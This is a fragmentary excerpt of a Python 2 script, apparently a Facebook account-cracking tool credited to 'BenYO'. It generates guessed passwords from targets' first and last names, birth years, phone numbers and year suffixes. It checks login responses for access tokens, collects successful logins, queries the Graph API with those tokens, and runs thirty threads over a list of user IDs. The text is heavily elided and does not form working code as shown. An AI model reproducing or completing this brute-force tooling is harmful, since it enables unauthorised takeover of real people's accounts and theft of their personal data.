...
def pilih_super():
			            ...
			            if 'access_token' in q:	
					       ...
					       if 'access_token' in q:	
						       ...
						       oks.append(user+pass3)
						           ...
						           pass4 = b['first_name'] + b['Birth_Year']											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						                       ...
						                       pass5 = b['first_name'] + b['mobile_phone']							
								                               ...
								                               if 'access_token' in q:		
										                           ...
										                           pass8 = b['last_name']+'2019'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										                                       ...
										                                       pass9 = b['first_name']+ b['last_name']+ '2020'					
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBenYO\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By BenYO--•◈•---»" #Dev:BenYO
